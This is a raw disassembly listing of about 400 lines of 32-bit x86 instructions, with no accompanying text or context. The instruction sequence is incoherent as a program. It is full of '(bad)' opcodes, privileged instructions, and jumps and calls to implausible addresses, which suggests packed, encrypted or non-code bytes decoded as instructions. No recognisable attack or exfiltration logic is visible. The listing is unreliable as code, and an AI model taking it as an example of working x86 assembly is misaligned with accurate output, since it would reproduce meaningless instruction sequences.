  41524b:	fmul   DWORD PTR [ecx+0x458bd845]
  415251:	fmul   DWORD PTR [ebx+0x40c3f0c7]
  415257:	enter  0x1303,0xc
  41525b:	inc    ebp
  41525c:	dec    ebp
  41525d:	xor    edi,DWORD PTR [ebx]
  41525f:	add    esi,DWORD PTR [edx+0x50]
  415262:	mov    ecx,DWORD PTR [eax+esi*8]
  415265:	inc    ebp
  415266:	inc    eax
  415267:	push   eax
  415268:	mov    ebp,esp
  41526a:	lock inc DWORD PTR [ecx-0x75]
  41526e:	mov    esp,esp
  415270:	fadd   DWORD PTR [eax]
  415272:	rol    edi,0xee
  415275:	test   BYTE PTR [eax],al
  415277:	dec    esp
  415278:	push   0x32
  41527a:	dec    DWORD PTR [ebx-0x30ba0314]
  415280:	push   eax
  415281:	mov    dh,0x21
  415283:	add    edi,edi
  415285:	cmp    edi,DWORD PTR [eax-0x7877af1]
  41528b:	add    BYTE PTR [ebp-0x75],al
  41528e:	(bad)  
  41528f:	loopne 0x41525d
  415291:	add    BYTE PTR [ebp+0x4584f8c7],al
  415297:	dec    esp
  415298:	xor    esi,DWORD PTR [edx]
  41529a:	pushf  
  41529b:	mov    eax,edi
  41529d:	cld    
  41529e:	(bad)  
  41529f:	iret   
  4152a0:	test   DWORD PTR [esi+0x3b4d03f8],esi
  4152a6:	mov    DWORD PTR [edi],ecx
  4152a8:	in     al,0x58
  4152aa:	dec    ebp
  4152ab:	add    BYTE PTR [ecx+0x4df0e08b],cl
  4152b1:	add    BYTE PTR [ecx+0x4d84f0c7],cl
  4152b7:	dec    esp
  4152b8:	mov    DWORD PTR [edx],esi
  4152ba:	fmul   QWORD PTR [ebx-0x30cc03b3]
  4152c0:	add    esi,DWORD PTR [esi+0x3bd80389]
  4152c6:	test   DWORD PTR [edi],0x3d3800
  4152cc:	test   DWORD PTR [ebx+0x84dcf8],ecx
  4152d2:	add    edi,eax
  4152d4:	add    BYTE PTR [ebp+ecx*2-0x74cdccb4],al
  4152db:	mov    eax,DWORD PTR [ebx]
  4152dd:	cld    
  4152de:	mov    edi,ecx
  4152e0:	hlt    
  4152e1:	mov    dh,0x45
  4152e3:	add    esi,DWORD PTR [ebx]
  4152e5:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  4152eb:	add    BYTE PTR [eax],al
  4152ed:	mov    eax,DWORD PTR [ebp-0x20]
  4152f0:	mov    eax,DWORD PTR [eax]
  4152f2:	call   0x33c5a0be
  4152f7:	dec    esp
  4152f8:	add    esi,DWORD PTR [edx]
  4152fa:	cmp    ecx,DWORD PTR [ebx+0x98be475]
  415300:	cld    
  415301:	iret   
  415302:	(bad)  
  415303:	mov    ebx,es
  415305:	dec    esp
  415306:	push   0x32
  415308:	lea    esi,[edx]
  41530a:	mov    al,0x8b
  41530c:	call   0xff4b4e01
  415311:	iret   
  415312:	inc    ebp
  415313:	mov    WORD PTR [ebx-0x75cdccb4],cs
  415319:	or     al,BYTE PTR ds:0xe4728b
  41531f:	or     DWORD PTR [ebp-0x31],ecx
  415322:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb0]
  415329:	cmp    al,cl
  41532b:	je     0x415505
  415331:	mov    eax,DWORD PTR [ebp-0x10]
  415334:	mov    eax,DWORD PTR [eax]
  415336:	xor    eax,edi
  415338:	mov    al,BYTE PTR [ebp+eax*1+0x32724c]
  41533f:	mov    ecx,DWORD PTR [ebp-0x20]
  415342:	xor    ecx,DWORD PTR [ecx]
  415344:	bswap  edi
  415346:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb4],0x32
  41534e:	add    DWORD PTR [ebx+0x945dc00],ecx
  415354:	mov    ecx,edi
  415356:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41535d:	or     al,BYTE PTR [eax]
  41535f:	mov    ecx,DWORD PTR [ebp-0x20]
  415362:	xor    ecx,DWORD PTR [ecx]
  415364:	bswap  edi
  415366:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb0],0x3a
  41536e:	add    DWORD PTR [edi],ecx
  415370:	add    BYTE PTR [eax-0x7474ffbb],dl
  415376:	xor    ebx,esp
  415378:	mov    al,BYTE PTR [eax]
  41537a:	add    eax,0x8472c7
  41537f:	dec    esp
  415380:	dec    ebp
  415381:	xor    dh,BYTE PTR [ebx]
  415383:	mov    ecx,DWORD PTR [edi]
  415385:	lock ror BYTE PTR [ecx],0xcb
  415389:	iret   
  41538a:	ror    DWORD PTR [esp+eax*4+0x32014c],0x32
  415392:	inc    ebp
  415393:	mov    ecx,DWORD PTR [ebx-0x75f6cc1c]
  415399:	iret   
  41539a:	add    eax,0x4c728c
  41539f:	xor    cl,BYTE PTR [ebp+0xa]
  4153a2:	mov    ecx,DWORD PTR [ebx+0x98af033]
  4153a8:	or     eax,0x8c72cf
  4153ad:	push   eax
  4153ae:	shl    DWORD PTR [edx],0x4d
  4153b1:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  4153b7:	fmul   QWORD PTR ds:0xc77200
  4153bd:	test   cl,al
  4153bf:	dec    esp
  4153c0:	dec    ebp
  4153c1:	xor    cl,BYTE PTR [ebx-0x751bcc75]
  4153c7:	or     DWORD PTR ds:0x8c72cf,ecx
  4153cd:	dec    esp
  4153ce:	enter  0x8532,0x32
  4153d2:	add    BYTE PTR [ebx+0x945e000],cl
  4153d8:	mov    ecx,edi
  4153da:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  4153e1:	or     al,BYTE PTR [eax]
  4153e3:	mov    ecx,DWORD PTR [ebp-0x24]
  4153e6:	mov    ecx,DWORD PTR [ecx]
  4153e8:	xor    ecx,edi
  4153ea:	mov    cl,BYTE PTR [ebp+ecx*1+0x327250]
  4153f1:	cmp    al,cl
  4153f3:	jne    0x415442
  4153f5:	lea    ecx,[ebx-0x7517cc50]
  4153fb:	sti    
  4153fc:	or     eax,0x4d72ff
  415401:	cmp    eax,ecx
  415403:	je     0x415452
  415405:	mov    ecx,DWORD PTR [ebx-0x7538cc04]
  41540b:	ret    
  41540c:	or     eax,0x8b7245
  415411:	call   0x84c71bde
  415416:	add    BYTE PTR [eax+eax*1-0x74ccbace],bl
  41541d:	mov    esi,DWORD PTR [ebx]
  41541f:	cld    
  415420:	mov    dl,BYTE PTR [ebp+0x5]
  415423:	xor    esi,DWORD PTR [edx+0x3]
  415426:	add    BYTE PTR [ebx],bh
  415428:	dec    ebp
  415429:	jnp    0x8b408826
  41542f:	mov    ecx,DWORD PTR ds:0x4d72fc
  415435:	xor    eax,ecx
  415437:	add    ecx,DWORD PTR [ebp+0x3b]
  41543a:	mov    esi,DWORD PTR [ebp+0x33]
  41543d:	mov    ecx,DWORD PTR [edx+0x724d0de8]
  415443:	xor    eax,DWORD PTR [eax]
  415445:	(bad)  
  415446:	ror    DWORD PTR [eax],0x4d
  415449:	jb     0x4153d6
  41544b:	add    BYTE PTR [ebx],dh
  41544d:	ja     0x4153d9
  41544f:	sbb    BYTE PTR ds:0x8d7275,cl
  415455:	cwde   
  415456:	enter  0x50e8,0xf3
  41545a:	inc    ebp
  41545b:	dec    DWORD PTR [ebx-0x7574ccbb]
  415461:	fadd   DWORD PTR ds:0xc372c7
  415467:	ror    DWORD PTR [ebp+0x13],0x8b
  41546b:	inc    ebp
  41546c:	xor    esi,DWORD PTR [ebx]
  41546e:	mov    al,BYTE PTR [ebx]
  415470:	or     eax,0x187250
  415475:	inc    ebp
  415476:	rcl    DWORD PTR [eax+0x4d],0xdc
  41547a:	mov    edi,edi
  41547c:	xor    ecx,DWORD PTR [ebx-0x3ff21376]
  415482:	jb     0x41540d
  415484:	add    ah,bl
  415486:	shl    DWORD PTR [ebp+0x4d],0xff
  41548a:	mov    ebx,esp
  41548c:	xor    eax,DWORD PTR [ebp-0x76]
  41548f:	add    ecx,DWORD PTR ds:0xe87208
  415495:	repz enter 0x10ff,0x45
  41549a:	inc    ebp
  41549b:	mov    edx,DWORD PTR [eax-0x28]
  41549e:	xor    bh,al
  4154a0:	inc    ebx
  4154a2:	mov    eax,ecx
  4154a4:	mov    eax,0xa00c111
  4154a9:	jne    0x4154f0
  4154ab:	mov    esi,DWORD PTR [ebx]
  4154ad:	test   al,0x3
  4154af:	inc    ebp
  4154b0:	mov    DWORD PTR [eax-0xc],edx
  4154b3:	mov    ds:0x8b33ff45,al
  4154b8:	lea    edx,[eax]
  4154ba:	xor    BYTE PTR [ebp+0x72],cl
  4154bd:	add    DWORD PTR [eax],eax
  4154bf:	mov    eax,edi
  4154c1:	lods   al,BYTE PTR ds:[esi]
  4154c2:	dec    ebp
  4154c3:	inc    ebp
  4154c4:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  4154ca:	retf   
  4154cb:	mov    edx,ecx
  4154cd:	adc    al,0x84
  4154cf:	(bad)  
  4154d0:	std    
  4154d1:	ret    
  4154d2:	jmp    FWORD PTR [edi-0x37474bb]
  4154d8:	hlt    
  4154d9:	push   ebp
  4154da:	(bad)  
  4154db:	xor    eax,ebx
  4154dd:	(bad)  
  4154de:	enter  0x1111,0x72
  4154e2:	inc    ebp
  4154e3:	add    BYTE PTR [ebx-0x387deb3f],cl
  4154e9:	cld    
  4154ea:	test   bh,bh
  4154ec:	pushf  
  4154ed:	inc    ebp
  4154ee:	xor    bl,BYTE PTR [edi-0x15]
  4154f1:	pop    ebx
  4154f2:	push   0xffffffc2
  4154f4:	inc    DWORD PTR [eax]
  4154f6:	in     al,dx
  4154f7:	mov    eax,DWORD PTR [ebp+0x51]
  4154fa:	push   eax
  4154fb:	inc    ebp
  4154fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154fd:	mov    edi,edi
  4154ff:	or     BYTE PTR [ebx+0x4d80fc16],cl
  415505:	add    DWORD PTR [ebx],esi
  415507:	add    BYTE PTR [ebx],al
  415509:	add    BYTE PTR [ebx],bh
  41550b:	icebp  
  41550c:	je     0x415516
  41550e:	mov    eax,DWORD PTR [edi]
  415510:	cld    
  415511:	rol    edi,0x72
  415514:	ret    
  415515:	add    BYTE PTR [edx-0x2f],ch
  415518:	lea    edx,[eax]
  41551a:	cwde   
  41551b:	jne    0x415505
  41551d:	(bad)  
  41551e:	clc    
  41551f:	or     al,0xff
  415521:	inc    DWORD PTR [ebp-0x18]
  415524:	cmp    ebx,0x18
  415527:	inc    DWORD PTR [ebp+0x6]
  41552a:	call   FWORD PTR [ebp-0x54]
  41552d:	or     al,0x75
  41552f:	push   ebp
  415530:	mov    ebp,esp
  415532:	test   al,0x53
  415534:	inc    ebp
  415535:	mov    edx,DWORD PTR [eax-0x75]
  415538:	imul   ecx,DWORD PTR [eax],0xffffffff
  41553b:	dec    ebp
  41553c:	mov    edx,DWORD PTR [edi-0x4]
  41553f:	push   ebp
  415540:	dec    ebp
  415541:	push   ecx
  415542:	xor    esi,DWORD PTR [ebx]
  415544:	add    edi,DWORD PTR [edi+0x74723b]
  41554a:	push   0xffffffc7
  41554c:	inc    DWORD PTR [ecx]
  41554e:	lods   al,BYTE PTR ds:[esi]
  41554f:	inc    ebp
  415550:	inc    ebp
  415551:	mov    eax,DWORD PTR [ebx]
  415553:	xchg   esp,eax
  415554:	or     BYTE PTR [eax],al
  415556:	call   0xffcd4de6
  41555b:	adc    al,0x45
  41555d:	or     BYTE PTR [ebx+0x800ac01],0x0
  415564:	inc    ebp
  415565:	inc    ecx
  415566:	add    ecx,DWORD PTR [ebx-0x76baebec]
  41556c:	mov    eax,DWORD PTR [ecx]
  41556e:	call   0x338aa273
  415573:	push   0x3
  415575:	push   0xc1300f
  41557a:	dec    ebp
  41557b:	jo     0x415508
  41557d:	push   0xffffffd4
  41557f:	dec    edi
  415581:	mov    DWORD PTR [ebx+ecx*4-0x3ccdf764],ecx
  415588:	cmp    eax,edi
  41558a:	cmovne edx,DWORD PTR [edi-0x75]
  41558e:	call   DWORD PTR [eax]
  415590:	mov    eax,DWORD PTR [ebp+0x8]
  415593:	call   FWORD PTR [esi+0x14]
  415596:	leave  
  415597:	inc    ebp
  415598:	adc    BYTE PTR [eax+0x55],dl
  41559b:	jne    0x415589
  41559d:	call   0xff52552d
  4155a2:	dec    ebp
  4155a3:	inc    ebp
  4155a4:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4155aa:	add    BYTE PTR [ebx],bh
  4155ac:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4155b0:	push   ebp
  4155b1:	or     al,0x51
  4155b3:	dec    ebp
  4155b4:	xor    DWORD PTR [ebx],0xf32039c
  4155ba:	cmp    eax,DWORD PTR [ebp+0x74]
  4155bd:	mov    edi,edi
  4155bf:	pop    edi
  4155c0:	adc    BYTE PTR [ebx+0x75],bl
  4155c3:	ret    0x50
  4155c6:	mov    ecx,DWORD PTR ss:[edx-0x7d]
  4155ca:	(bad)  
  4155cb:	clc    
  4155cc:	mov    esp,ebp
  4155ce:	pop    ecx
  4155cf:	mov    ecx,0xf80085c2
  4155d4:	mov    ecx,DWORD PTR [ecx+edx*2]
  4155d7:	push   esi
  4155d8:	push   esi
  4155d9:	(bad)  
  4155da:	lock inc DWORD PTR [ebp+0x44]
  4155de:	mov    edx,DWORD PTR [eax]
  4155e0:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  4155e4:	or     BYTE PTR [ebp+0x7],dl
  4155e7:	push   ecx
  4155e8:	ret    
  4155e9:	xor    ebx,DWORD PTR [esi+edi*4+0x37232]
  4155f0:	mov    esi,edi
  4155f2:	mov    edi,DWORD PTR [esp+edx*1+0xc]
  4155f6:	cmp    BYTE PTR [ebp+0x1],0x89
  4155fa:	add    BYTE PTR [eax+ecx*1],ah
  4155fd:	cmp    DWORD PTR [ebp+0x10],eax
  415600:	mov    edx,DWORD PTR [esi]
  415602:	xchg   esp,eax
  415603:	dec    esp
  415604:	add    BYTE PTR [eax],dl
  415606:	mov    ecx,edx
  415608:	add    edx,DWORD PTR [esp+edi*1+0x8]
  41560c:	dec    ebp
  41560d:	into   
  41560e:	mov    ebp,DWORD PTR [edi+0x240089d8]
  415614:	mov    edx,DWORD PTR [eax+0x14]
  415617:	das    
  415618:	add    al,0x45
  41561a:	add    BYTE PTR [ebp+0x0],dh
  41561d:	mov    edi,edi
  41561f:	and    al,0x50
  415621:	mov    eax,DWORD PTR [eax]
  415623:	and    al,0xd1
  415625:	xor    eax,DWORD PTR [esi]
  415627:	lea    eax,[ebp+0x8]
  41562a:	xor    esi,DWORD PTR [edx+0x3]
  41562d:	add    BYTE PTR [ecx+0x4510fc44],cl
  415633:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  415639:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  415643:	xor    bh,bh
  415645:	pushf  
  415646:	mov    edi,edi
  415648:	or     BYTE PTR [esi+ecx*1],cl
  41564b:	jne    0x415610
  41564d:	call   0xa5619
  415652:	adc    BYTE PTR [ebp+eax*2+0xc],al
  415656:	mov    ebx,DWORD PTR [eax]
  415658:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  41565c:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  415664:	pop    esi
  415665:	dec    ecx
  415667:	and    al,0x10
  415669:	call   DWORD PTR [ebp+0x24]
  41566c:	in     al,dx
  41566d:	call   0xffc55556
  415672:	adc    BYTE PTR [ecx+esi*1+0xc],al
  415676:	pushf  
  415677:	pop    esi
  415678:	mov    ebp,esp
  41567a:	and    al,0xc2
  41567c:	push   edi
  41567d:	add    BYTE PTR [ecx+0x33],al
  415680:	mov    DWORD PTR [ebp+0x24],esi
  415683:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  415689:	dec    DWORD PTR [eax]
  41568b:	and    al,0x7
  41568d:	(bad)  
  41568e:	cli    
  41568f:	and    al,0x9c
  415691:	or     BYTE PTR [edx],dh
  415693:	sbb    BYTE PTR [ebx],al
  415695:	adc    al,0x89
  415697:	jmp    DWORD PTR [esp]
  41569a:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  4156a0:	adc    al,0x8
  4156a2:	dec    ebp
  4156a3:	adc    BYTE PTR [ebp-0x7c],dh
  4156a6:	mov    esi,DWORD PTR [edx]
  4156a8:	and    al,0x24
  4156aa:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  4156b0:	add    edi,eax
  4156b2:	pcmpeqb mm1,mm2
  4156b5:	jmp    0x415703
  4156b7:	dec    DWORD PTR [eax]
  4156b9:	je     0x4156a6
  4156bb:	mov    edi,DWORD PTR [ecx]
  4156bd:	pop    ebp
  4156be:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  4156c2:	pushf  
  4156c3:	mov    DWORD PTR [eax-0x8],ebp
  4156c6:	jge    0x415730
  4156c8:	dec    DWORD PTR [ecx+0x5fbf7424]
